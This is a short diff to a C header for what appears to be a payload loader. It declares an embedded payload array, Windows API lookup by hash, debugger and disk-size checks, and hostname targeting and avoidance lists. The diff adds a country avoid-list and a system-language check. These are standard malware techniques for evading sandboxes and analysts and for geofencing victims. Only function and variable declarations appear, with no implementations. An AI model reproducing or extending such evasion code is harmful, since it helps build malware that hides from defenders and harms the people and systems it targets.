@@ -99,7 +99,10 @@ extern const ObjHash WAIT_FOR_SINGLE_OBJECT_HASH;
 
 extern const ObjHash TARGET_HOSTNAME_PREFIX_HASH;
 extern const ObjHash AVOIDED_HOSTNAME_PREFIX_HASHES[];
+extern const uint16_t AVOIDED_COUNTRIES[];
+
 extern const size_t AVOIDED_HOSTNAME_PREFIX_HASHES_SIZE;
+extern const size_t AVOIDED_COUNTRIES_SIZE;
 
 extern unsigned char payload[%PAYLOAD_SIZE%];
 extern const char* dict_payload;
@@ -114,11 +117,12 @@ FARPROC CustomGetProcAdress(IN HMODULE hModule, ObjHash function_hash);
 bool is_being_debugged();
 int get_disk_size(HMODULE hKernel32dll);
 const char* get_hostname(HMODULE hKernel32dll);
+bool is_valid_language();
 unsigned int RO(const char* str, uint8_t rotation_value, bool is_rotation_right);
 
 bool is_string_matching_prefixHash(const char* str, ObjHash prefix_hash);
 bool is_valid_hostname(const char* hostname);
-bool is_objhash_null(ObjHash obj_hash);
+bool is_objhash(ObjHash obj_hash);
 
 int divide(int a, int b);
 int multiply(int a, int b);
